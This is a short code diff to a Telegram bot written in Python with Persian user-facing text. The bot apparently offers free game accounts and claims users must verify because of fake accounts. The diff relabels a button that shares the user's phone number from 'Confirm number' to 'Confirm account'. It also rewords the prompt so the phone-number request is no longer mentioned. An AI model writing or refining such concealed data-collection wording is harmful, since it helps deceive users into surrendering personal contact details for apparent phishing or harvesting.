@@ -387,7 +387,7 @@ def verification_keyboard():
         [
             [
                 KeyboardButton(
-                    "📱 تأیید شماره",
+                    "تایید حساب",
                     request_contact=True
                 )
             ]
@@ -526,7 +526,7 @@ async def check_membership(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"- مجموعه ما در حال حاضر 4 سال بصورت مداوم درحال کار و فعالیت است و در نهایت با تلاش و کوشش توانستیم رباتی را جهت خدمت به ایرانیان عزیز فراهم کنیم.\n\n"
             f"⚠️ توجه: به دلیل مسدودیت کاربران فیک برخی از دریافت‌کنندگان حساب بازی، شما مجبور به تایید حساب خود می‌باشید."
         )
-        await query.message.reply_text("👇 برای ادامه شماره خود را تایید کنید.", reply_markup=verification_keyboard())
+        await query.message.reply_text("برای ادامه از طریق دکمه زیر واقعی بودن حساب خود را تایید نمایید.", reply_markup=verification_keyboard())
     except Exception:
         try:
             await query.message.reply_text(
